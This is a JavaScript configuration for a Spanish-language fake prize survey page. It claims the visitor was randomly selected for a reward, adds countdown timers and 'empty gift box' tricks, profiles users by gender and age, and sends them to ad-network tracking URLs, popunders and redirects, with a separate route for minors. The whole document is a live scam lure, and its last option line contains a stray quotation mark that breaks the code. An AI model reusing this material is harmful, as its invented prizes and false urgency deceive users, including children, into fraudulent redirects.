window.surveyData={adex:1,adex_alert_urll:'https://lehtymns.com/4453095/?var={zone}&ymid={request_var}',adex_warning_urll:'https://lehtymns.com/4453095/?var={zone}&ymid={request_var}',ipp_zonex:4599387,ipp_zone_teenagex:4599749,ipp_zone_reverse:4453914,comment:'Sweep New 6 ES Proofreading',autoexitx:4254940,push_zonex:4843177,reverse_zonex:4254937,popunder_urll:'https://lehtymns.com/4254936/?var={zone}&ymid={request_var}',lead:{not_unique:{redirect_urll:'https://lehtymns.com/4254934/?var={zone}&ymid={request_var}',},},title:'Estimado usuario',subtitle:['Te ofrecemos la oportunidad de recibir una recompensa de nuestros patrocinadores.','Para recibir tu recompensa, simplemente completa nuestra breve y anónima encuesta.','Solo tienes <b>{min} minutos y {sec} segundos</b> para participar.',],logo_text:'¡Enhorabuena! <br><br>Concurso promocional el <b>{date:today}</b>',alert:{welcome:`<h1>¡Enhorabuena!</h1>
                <p>
                    Hoy <b>{date:today}</b> has sido seleccionado aleatoriamente para participar en este cuestionario.
                    Solo tomará un minuto y tendrás la oportunidad de recibir un premio.
                </p>
                <img src='/img/sweep/tokens10k.png'>
                <p>
                    Cada semana seleccionamos aleatoriamente 10 usuarios.
                    Solo 10 usuarios afortunados que viven en <b>{countryName}</b> tienen la oportunidad de recibir una recompensa.
                </p>
                <p>
                    Solo tienes <span><b>{min} minutos y {sec} segundos</b></span> para participar.
                    <br>
                    ¡Date prisa!
                    ¡Hay un número limitado de premios!
                </p>`,welcomebtn:'Continuar',empty:'Lo sentimos, esta caja de regalo está vacía. Aún te quedan unos cuantos intentos. Buena suerte.',final:'',},main:{type:'question',text:'¿Cuál es tu género?',options:[{type:'button',text:'Hombre',audience_id:[61427,60623],action:{goto:'step2',},},{type:'button',text:'Mujer',audience_id:[61428,60624],action:{goto:'step2',},},],},step2:{type:'question',text:'¿Cuántos años tienes?',options:[{type:'button',text:'menos de 18 años',audience_id:[61421,62387,60625],action:{redirect_ipp:'teenage',redirect_url: SmartURL,popunder_url: SmartURL,},},{type:'button',text:'18-29 años',audience_id:[62180,62377,68427,78100,62377,62382,68423,78096],action:{goto:'step3',},},{type:'button',text:'30-49 años',audience_id:[62181,62380,68425,78097,62383,78101],action:{goto:'step3',},},{type:'button',text:'50-80 años',audience_id:[62182,62381,68426,78098,62384,78102],action:{goto:'step3',},},],},step3:{type:'question',text:'¿Con qué frecuencia haces compras online?',options:[{type:'button',text:'Todos los días',audience_id:0,action:{goto:'step4',},},{type:'button',text:'Frecuentemente',audience_id:0,action:{goto:'step4',},},{type:'button',text:'Rara vez',audience_id:0,action:{goto:'step4',},},{type:'button',text:'Nunca',audience_id:0,action:{goto:'step4',},},],},step4:{type:'question',text:'¿Has usado alguna vez tarjetas de regalo o cupones para tus compras?',options:[{type:'button',text:'Sí',audience_id:0,action:{goto:'step5',},},{type:'button',text:'No',audience_id:0,action:{goto:'step5',},},],},step5:{type:'question',text:'¿Te interesa obtener los mayores descuentos y regalos?',options:[{type:'button',text:'Sí',audience_id:0,action:{goto:'step6',},},{type:'button',text:'No',audience_id:0,action:{goto:'step6',},},],},step6:{type:'question',text:'¿Qué preferirías?',options:[{type:'button',text:'Una tarjeta regalo',audience_id:0,action:{goto:'final',},},{type:'button',text:'Descuento único',audience_id:0,action:{goto:'final',},},{type:'button',text:'Una tarjeta de descuento',audience_id:0,action:{goto:'final',},},],},final:{type:'thank_you',boxes:1,timeout:40,timeout_url: SmartURL,timeout_conversion:1,content:`<div class="final">
                        <div class="final__step1">
                            <p>Gracias por responder nuestro cuestionario.</p>
                            <p>Ahora tienes la oportunidad de recibir una recompensa.</p>
                            <p>Todo lo que tienes que hacer es elegir la caja de regalo correcta.</p>
                        </div>
                        <div class="final__step2">
                            <p>¡Vaya!</p>
                            <p>Estas cajas están vacías.</p>
                            <p>Aún tienes la oportunidad de recibir una recompensa de nuestros socios.</p>
                            <p>¡Esta oferta solo está disponible durante los próximos 7 minutos!</p>
                        </div>
                        <div class="instructions">
                            <h2 class="instructions__header">¡Encuentra tu regalo!</h2>
                            <div class="instructions__text">
                            <span class=bounce>↓</span>
                            <h3 class="instructions__text-1">Todo lo que tienes que hacer es elegir <b>la caja de regalo correcta</b>.</h3>
                            <h3 class="instructions__text-2">Haz clic en el botón CONTINUAR y completa los pasos finales para tener la oportunidad de recibir una recompensa.</h3>
                            <span class=bounce>↓</span>
                        </div>
                    </div>
                </div>`,progress_title:'Estimando los resultados...',progress_texts:['Espera... Verificación de respuestas','Espera... Contar tu puntuación'],progress_content:'',options:[{type:'button',text:'CONTINUAR',audience_id:61426,action:{conversion:1,redirect_url: SmartURL',},},],},};